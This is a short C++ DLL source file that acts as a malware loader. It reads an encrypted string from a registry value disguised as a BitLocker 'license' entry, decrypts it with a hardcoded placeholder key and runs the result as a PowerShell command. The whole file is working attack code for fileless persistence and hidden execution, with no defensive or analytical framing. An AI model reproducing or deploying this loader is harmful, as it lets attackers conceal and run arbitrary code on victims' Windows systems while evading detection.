// dllmain.cpp : Definiert den Einstiegspunkt für die DLL-Anwendung.
#include "pch.h"
#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#include <Windows.h>
#include <winreg.h>
#include <iostream>
#include <string>
#include "getreg.hpp"
#include "converter.hpp"
#include "crypt.hpp"

using namespace std;
void run(string in) {
    string prc = "powershell -Command " + in;
    const char* cmd = prc.c_str();
    system(cmd);
}
string get() {
    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BitLocker";
    auto output = RegGetString(HKEY_LOCAL_MACHINE, subkey, L"license");
    wstring val;
    for (auto i : output)
        val += i;
    string out = wstring_convert_to_string(val);
    return out;
}
int init(string key)
{
    string raw = get();
    size_t lenght = 64;
    string payload = decrypt(raw, lenght, key);
    run(payload);
    return 0;
}
int main()
{
    try
    {
        unsigned char KEY[16] = "__MaRK_kEy";
        string key = Unsign_charray_to_string(KEY);
        init(key);
    }
    catch (exception& roException)
    {
        cout << "Exception: " << roException.what() << endl;
    }
}
